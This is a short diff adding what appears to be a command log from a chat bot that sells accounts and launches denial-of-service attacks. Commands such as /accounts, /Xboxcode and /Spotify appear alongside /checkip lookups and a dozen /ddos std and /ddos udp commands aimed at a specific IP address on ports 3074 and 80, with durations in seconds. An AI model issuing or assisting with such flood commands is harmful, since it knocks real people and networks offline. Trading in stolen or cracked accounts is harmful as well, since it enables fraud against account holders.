@@ -1,0 +1,29 @@
+/commands
+/xboxcode
+/check 
+108.184.226.213
+/checkip 
+108.184.226.213
+/checkip 
+108.184.226.213
+/accounts
+/Xboxcode
+/Spotify
+/plans
+/help
+/tr4p
+/methods
+/help
+/ddoss std 
+73.6.242.180 300 dport=3074
+/methods
+/ddos std 
+73.6.242.180 300 dport=3074
+/ddos std 
+73.6.242.180 120 dport=80
+/ddos std 
+73.6.242.180 60 dport=80
+/ddos std 73.6.242.180 300 dport=80
+/stop
+/ddos udp 73.6.242.180 300 dport=3074
+/ddos std 73.6.242.180 120 dport=3074
